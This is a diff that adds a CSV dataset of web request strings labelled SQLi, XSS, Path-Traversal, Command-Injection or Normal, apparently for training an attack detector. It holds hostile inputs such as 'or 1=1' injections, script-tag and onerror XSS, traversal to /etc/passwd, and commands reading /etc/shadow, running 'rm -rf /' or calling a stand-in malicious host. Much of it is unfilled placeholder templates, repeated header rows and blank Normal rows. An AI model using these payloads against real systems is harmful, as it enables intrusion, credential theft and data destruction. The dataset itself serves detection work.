@@ -1,0 +1,296 @@
+payload,label
+'HBrowN' or 1=1--,SQLi
+'joshuaCLarK' and 1=1--,SQLi
+App/liSt?user=iGonzaLes,Normal
+wp-cOntent?seARch=cITizen,Normal
+'blee' aNd 1=1--,SQLi
+posts/postS?SEaRch=biLl,Normal
+tags/categoRy/lIst?user=robErtsanGela,Normal
+'FRank15' and 1=1--,SQLi
+seArCh?USer=chAseamY,Normal
+Explore/CAteGories/App?sEaRch=soUnD,Normal
+posTs/Main?PaGe=83,Normal
+wP-content?searcH=perHAps,Normal
+'eriCa12' aND 1=1--,SQLi
+'TaMmYWOod' and 1=1--,SQLi
+CatEGoriES/wp-cOntent/tAgS?User=WilsonrobeRT,Normal
+posTs?seArCh=anyThiNg,Normal
+wP-conteNT?search=quIckLy,Normal
+blog/poStS/MaiN?uSer=ngUTIeRRez,Normal
+blOG?PagE=21,Normal
+'oking' oR 1=1--,SQLi
+list/PostS/List?SeArch=wIndOw,Normal
+'candice27' anD 1=1--,SQLi
+%2e%2e/%2e%2e/etC/passwD,Path-Traversal
+'alaN82' oR 1=1--,SQLi
+sEaRch/exPlore?seArCH=FoRmeR,Normal
+app?UsER=amAndAwillIams,Normal
+'DmarsH' Or 1=1--,SQLi
+App/TaGS/sEArCh?PAge=59,Normal
+'NjohNSOn' And 1=1--,SQLi
+'grEeD' oR 1=1--,SQLi
+'fbrOwn' And 1=1--,SQLi
+CAtEgories?SeArcH=yet,Normal
+| unaMe -a,Command-Injection
+wP-contenT?sEarch=capItal,Normal
+' or 1=1-- ,SQLi
+'raymonDlesliE' and 1=1--,SQLi
+'tlewis' Or 1=1--,SQLi
+eXPlORe/maiN?useR=shaNnonjoHnsON,Normal
+'racHELwaTerS' or 1=1--,SQLi
+Explore/Search?Page=12,Normal
+'cmUrphY' oR 1=1--,SQLi
+LiST/aPp/wp-content?SeArch=MIsS,Normal
+<svg oNload=AlerT(1)>,XSS
+poSTS/aPP/BlOg?sEarch=hoWevER,Normal
+'tayLormadiSon' OR 1=1--,SQLi
+lIsT/catEgOrieS?sEArch=agE,Normal
+'amandA79' OR 1=1--,SQLi
+sEarCH/bLog?PAgE=29,Normal
+'milLerkelLy' OR 1=1--,SQLi
+'LarRymoNtgomeRy' or 1=1--,SQLi
+'BrOwnterri' OR 1=1--,SQLi
+'CalvinRAmiRez' aNd 1=1--,SQLi
+'shEpARdaleXiS' oR 1=1--,SQLi
+sEArch/List/POsts?usEr=keithjonEs,Normal
+postS/Wp-cOnTEnT?Page=44,Normal
+'jennIfer43' AnD 1=1--,SQLi
+cATEgoRy/BloG/main?search=oUr,Normal
+Posts/app?PagE=86,Normal
+explorE/SeaRch?seArCh=COuntRY,Normal
+PostS/caTEgoRY?useR=davIdwarD,Normal
+'jpauL' aNd 1=1--,SQLi
+& unAME -a,Command-Injection
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/eTc/pAsswd,Path-Traversal
+'WenDyTOrres' or 1=1--,SQLi
+WP-cONtent/app/SEarch?SEarch=amonG,Normal
+'BishOpdonald' ANd 1=1--,SQLi
+PosTS?user=williamchAmbErs,Normal
+tAgs?sEarCh=paRtnEr,Normal
+'yDiAZ' Or 1=1--,SQLi
+categoRIes/catEgORy/TAg?user=kevinlee,Normal
+'deVon72' oR 1=1--,SQLi
+'PaNderSON' OR 1=1--,SQLi
+catEGoRIes/caTegory/Tags?User=robert82,Normal
+App/BLoG/caTEGOrY?search=agO,Normal
+'davISkENNetH' aNd 1=1--,SQLi
+'brIaNWooD' oR 1=1--,SQLi
+POSts?Page=1,Normal
+'DkErr' and 1=1--,SQLi
+'qMay' aND 1=1--,SQLi
+postS?USer=drodrIguez,Normal
+'jonathan45' and 1=1--,SQLi
+liSt/pOsTs/Tags?SearCh=poLITiCs,Normal
+eXPlORe/wp-content?USEr=ocoNNorstAceY,Normal
+payload,label
+'{user}' Or 1=1-- -,SQLi
+`{unix_cmd}`,Command-Injection
+<{tag} src=x onerror={func}>,XSS
+; cat /etc/shadow,Command-Injection
+....//....//{win_file},Path-Traversal
+; cat /etc/shadow,Command-Injection
+<{tag} src=x onerror={func}>,XSS
+' aNd EXISTS(SELECT * FROM ,SQLi
+'{user}' OR 1=1-- -,SQLi
+'; ,SQLi
+`{unix_cmd}`,Command-Injection
+' Or EXISTS(SELECT * FROM ,SQLi
+'{user}' Or 1=1-- -,SQLi
+"<object data=data:text/html;base64,{b64}>",XSS
+....//....//{win_file},Path-Traversal
+'{user}' || 1=1-- -,SQLi
+'{user}' AnD 1=1-- -,SQLi
+"' UNION SELECT null,{func}--",SQLi
+,Normal
+'; ,SQLi
+"' uNion SELECT null,{func}--",SQLi
+C:%5C..%5C..%5C{win_file},Path-Traversal
+<%  %>,Command-Injection
+,Normal
+<iframe src=javascript:{code}>,XSS
+....//....//{win_file},Path-Traversal
+| cat /etc/shadow,Command-Injection
+$({danger_cmd}),Command-Injection
+"' uNion SELECT null,{func}--",SQLi
+$({danger_cmd}),Command-Injection
+' || EXISTS(SELECT * FROM ,SQLi
+....//....//{win_file},Path-Traversal
+<%  %>,Command-Injection
+"' UNION SELECT null,{func}--",SQLi
+....//....//{win_file},Path-Traversal
+"<object data=data:text/html;base64,{b64}>",XSS
+/{dir}/%2e%2e/%2e%2e/{file},Path-Traversal
+<{tag} src=x onerror={func}>,XSS
+'{user}' oR 1=1-- -,SQLi
+| cat /etc/shadow,Command-Injection
+../../../../{file},Path-Traversal
+%252e%252e%252f{enc_file},Path-Traversal
+<iframe src=javascript:{code}>,XSS
+../../../../{file},Path-Traversal
+,Normal
+"<object data=data:text/html;base64,{b64}>",XSS
+/{dir}/%2e%2e/%2e%2e/{file},Path-Traversal
+'; ,SQLi
+<{tag} ,XSS
+"<object data=data:text/html;base64,{b64}>",XSS
+"' UnIoN SELECT null,{func}--",SQLi
+,Normal
+'{user}' AnD 1=1-- -,SQLi
+,Normal
+& curl http://malicious.site,Command-Injection
+"' uNion SELECT null,{func}--",SQLi
+' Or EXISTS(SELECT * FROM ,SQLi
+"' UnIoN SELECT null,{func}--",SQLi
+<iframe src=javascript:{code}>,XSS
+"<object data=data:text/html;base64,{b64}>",XSS
+<%  %>,Command-Injection
+user/{action}?id={num},Normal
+' aNd EXISTS(SELECT * FROM ,SQLi
+"' uNion SELECT null,{func}--",SQLi
+' OR EXISTS(SELECT * FROM ,SQLi
+& ping -c 3 example.com,Command-Injection
+<%  %>,Command-Injection
+<{tag} ,XSS
+....//....//{win_file},Path-Traversal
+,Normal
+'; ,SQLi
+'; ,SQLi
+<%  %>,Command-Injection
+"<object data=data:text/html;base64,{b64}>",XSS
+'; ,SQLi
+<{tag} src=x onerror={func}>,XSS
+'{user}' aNd 1=1-- -,SQLi
+; echo $PATH,Command-Injection
+<iframe src=javascript:{code}>,XSS
+; echo $PATH,Command-Injection
+' OR EXISTS(SELECT * FROM ,SQLi
+'; ,SQLi
+"' UnIoN SELECT null,{func}--",SQLi
+user/{action}?id={num},Normal
+`{unix_cmd}`,Command-Injection
+<%  %>,Command-Injection
+`{unix_cmd}`,Command-Injection
+"' UNION SELECT null,{func}--",SQLi
+%252e%252e%252f{enc_file},Path-Traversal
+'{user}' || 1=1-- -,SQLi
+/{dir}/%2e%2e/%2e%2e/{file},Path-Traversal
+../../../../{file},Path-Traversal
+' OR EXISTS(SELECT * FROM ,SQLi
+"<object data=data:text/html;base64,{b64}>",XSS
+,Normal
+<{tag} src=x onerror={func}>,XSS
+,Normal
+'{user}' oR 1=1-- -,SQLi
+<{tag} ,XSS
+<{tag} src=x onerror={func}>,XSS
+<script>alert('XSS')</script>,XSS
+../../../etc/passwd,Path-Traversal
+' OR 'a'='a'--,SQLi
+; ls -la,Command-Injection
+wp-content/uploads/image.jpg,Normal
+payload,label
+' || EXISTS(SELECT * FROM ,SQLi
+'; ,SQLi
+"<object data=data:text/html;base64,{b64}>",XSS
+"' uNion SELECT null,{func}--",SQLi
+`{unix_cmd}`,Command-Injection
+<iframe src=javascript:{code}>,XSS
+| ping -c 3 example.com,Command-Injection
+<iframe src=javascript:{code}>,XSS
+<{tag} src=x onerror={func}>,XSS
+& ping -c 3 example.com,Command-Injection
+$({danger_cmd}),Command-Injection
+<{tag} src=x onerror={func}>,XSS
+%252e%252e%252f{enc_file},Path-Traversal
+'{user}' aNd 1=1-- -,SQLi
+'{user}' || 1=1-- -,SQLi
+' AnD EXISTS(SELECT * FROM ,SQLi
+<{tag} ,XSS
+$({danger_cmd}),Command-Injection
+'; ,SQLi
+'; ,SQLi
+; echo $PATH,Command-Injection
+'{user}' OR 1=1-- -,SQLi
+../../../../{file},Path-Traversal
+' OR EXISTS(SELECT * FROM ,SQLi
+,Normal
+,Normal
+`{unix_cmd}`,Command-Injection
+/{dir}/%2e%2e/%2e%2e/{file},Path-Traversal
+`{unix_cmd}`,Command-Injection
+'{user}' Or 1=1-- -,SQLi
+<iframe src=javascript:{code}>,XSS
+,Normal
+<{tag} ,XSS
+,Normal
+'; ,SQLi
+"' uNion SELECT null,{func}--",SQLi
+../../../../{file},Path-Traversal
+'{user}' || 1=1-- -,SQLi
+,Normal
+"<object data=data:text/html;base64,{b64}>",XSS
+,Normal
+$({danger_cmd}),Command-Injection
+'{user}' Or 1=1-- -,SQLi
+"<object data=data:text/html;base64,{b64}>",XSS
+../../../../{file},Path-Traversal
+'{user}' OR 1=1-- -,SQLi
+& rm -rf /,Command-Injection
+user/{action}?id={num},Normal
+'{user}' OR 1=1-- -,SQLi
+/{dir}/%2e%2e/%2e%2e/{file},Path-Traversal
+,Normal
+'{user}' AnD 1=1-- -,SQLi
+"<object data=data:text/html;base64,{b64}>",XSS
+<{tag} src=x onerror={func}>,XSS
+"' UNION SELECT null,{func}--",SQLi
+"' uNion SELECT null,{func}--",SQLi
+/{dir}/%2e%2e/%2e%2e/{file},Path-Traversal
+$({danger_cmd}),Command-Injection
+%252e%252e%252f{enc_file},Path-Traversal
+' OR EXISTS(SELECT * FROM ,SQLi
+<iframe src=javascript:{code}>,XSS
+%252e%252e%252f{enc_file},Path-Traversal
+"' uNion SELECT null,{func}--",SQLi
+' OR EXISTS(SELECT * FROM ,SQLi
+| echo $PATH,Command-Injection
+"' UNION SELECT null,{func}--",SQLi
+<iframe src=javascript:{code}>,XSS
+<{tag} ,XSS
+,Normal
+$({danger_cmd}),Command-Injection
+"<object data=data:text/html;base64,{b64}>",XSS
+<iframe src=javascript:{code}>,XSS
+'; ,SQLi
+%252e%252e%252f{enc_file},Path-Traversal
+$({danger_cmd}),Command-Injection
+"' UNION SELECT null,{func}--",SQLi
+' oR EXISTS(SELECT * FROM ,SQLi
+| rm -rf /,Command-Injection
+../../../../{file},Path-Traversal
+'{user}' aNd 1=1-- -,SQLi
+' Or EXISTS(SELECT * FROM ,SQLi
+`{unix_cmd}`,Command-Injection
+../../../../{file},Path-Traversal
+<%  %>,Command-Injection
+%252e%252e%252f{enc_file},Path-Traversal
+'{user}' oR 1=1-- -,SQLi
+<{tag} src=x onerror={func}>,XSS
+<{tag} src=x onerror={func}>,XSS
+"' UNION SELECT null,{func}--",SQLi
+../../../../{file},Path-Traversal
+& cat /etc/shadow,Command-Injection
+; ping -c 3 example.com,Command-Injection
+' AnD EXISTS(SELECT * FROM ,SQLi
+%252e%252e%252f{enc_file},Path-Traversal
+'{user}' OR 1=1-- -,SQLi
+,Normal
+'; ,SQLi
+"<object data=data:text/html;base64,{b64}>",XSS
+' OR EXISTS(SELECT * FROM ,SQLi
+& curl http://malicious.site,Command-Injection
+<script>alert('XSS')</script>,XSS
+../../../etc/passwd,Path-Traversal
+' OR 'a'='a'--,SQLi
+; ls -la,Command-Injection
+wp-content/uploads/image.jpg,Normal
